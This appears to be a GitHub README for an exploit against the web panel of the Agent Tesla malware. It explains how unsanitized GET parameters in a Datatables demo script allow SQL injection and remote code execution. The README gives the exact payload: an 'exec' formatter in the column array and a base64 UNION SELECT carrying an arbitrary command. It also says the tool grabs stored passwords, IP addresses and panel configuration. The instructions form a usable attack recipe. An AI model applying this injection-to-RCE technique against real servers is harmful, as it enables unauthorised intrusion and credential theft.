# Agent-Tesla-Exploit

Exploits the Datatables demo unsanatized get paramerters to query database and run code remotly

Currently:
* Grabs Victim Ips
* Grabs Victim Passwords
* Exposes Panel Config

### How to use the RCE on your own
The file `WebServer/server_side/scripts/server processing` has 3 get paramerters:
* `table` : Database Table
* `primary` : Database Primary Key
* `clmns` : Columns as sanatized array & optional formatter
* `where`: SQL Where statment encoded in base64

To use, query `WebServer/server_side/scripts/server processing` with vaild table and primary paramerters
(i use `passwords` and `password_id`) and clmns as the sanatized version of:
```php
[array("db" => "[Vailed Column]", "dt" => "username","formatter" => "exec")]
```
and the `where` paramerter to the base64 equlivant of:
```
1=1 UNION SELECT "[your command here]"
```
